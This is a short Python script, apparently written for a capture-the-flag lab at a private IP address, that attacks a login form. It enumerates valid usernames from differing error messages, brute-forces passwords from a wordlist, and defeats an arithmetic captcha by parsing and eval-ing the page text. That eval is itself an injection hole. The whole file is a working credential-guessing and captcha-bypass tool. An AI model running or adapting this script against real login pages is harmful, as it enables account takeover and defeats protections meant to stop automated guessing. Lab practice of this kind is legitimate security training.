import requests, re

url = "http://10.10.240.154/login"

data = {
    "username": "user",
    "password": "pass",
    "captcha" : "capt" 
}

with open("usernames.txt", "r") as file:
    usernames = file.read().splitlines()

with open("passwords.txt", "r") as file:
    passwords = file.read().splitlines()

session = requests.Session()

def solve_captcha(response):
    question = re.search(r'(\d+\s*[\+\-\*/]\s*\d+)', response).group(1)
    answer = eval(question)

    data["captcha"] = str(answer)

def brute_force(inpt, wordlist, error):
    for item in wordlist:
        data[inpt] = item
        while True:
            response = session.post(url, data=data)
            if re.search("Invalid captcha", response.text):
                solve_captcha(response.text)
                continue

            elif error in response.text:
                solve_captcha(response.text)
                break
            else:
                return item

username = brute_force("username", usernames, "<strong>Error:</strong> The user")
password = brute_force("password", passwords, "Invalid password for user")

print(f"username: {username} - password: {password}")
